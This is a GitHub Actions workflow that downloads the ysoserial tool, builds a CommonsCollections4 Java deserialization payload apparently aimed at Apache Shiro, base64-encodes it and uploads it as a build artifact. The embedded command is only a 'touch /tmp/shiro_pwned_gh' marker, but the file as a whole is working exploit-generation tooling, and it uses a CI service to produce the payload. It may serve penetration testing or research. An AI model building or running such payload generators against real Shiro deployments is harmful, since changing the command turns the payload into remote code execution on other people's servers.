name: Generate Shiro Payload v2

on:
  workflow_dispatch:

jobs:
  generate:
    runs-on: ubuntu-latest
    steps:
      - name: Download ysoserial
        run: |
          curl -L -o ysoserial-all.jar https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar
          ls -lh ysoserial-all.jar
          file ysoserial-all.jar

      - name: Generate CommonsCollections4 payload
        run: |
          java -jar ysoserial-all.jar CommonsCollections4 "touch /tmp/shiro_pwned_gh" > payload.bin
          echo "Payload size: $(wc -c < payload.bin) bytes"
          base64 -w0 payload.bin > payload.b64
          echo "Base64 size: $(wc -c < payload.b64)"
          echo "PAYLOAD_START"
          head -c 100 payload.b64
          echo "..."
          echo "PAYLOAD_END"

      - name: Upload payload
        uses: actions/upload-artifact@v4
        with:
          name: shiro-payload
          path: payload.b64
          retention-days: 1
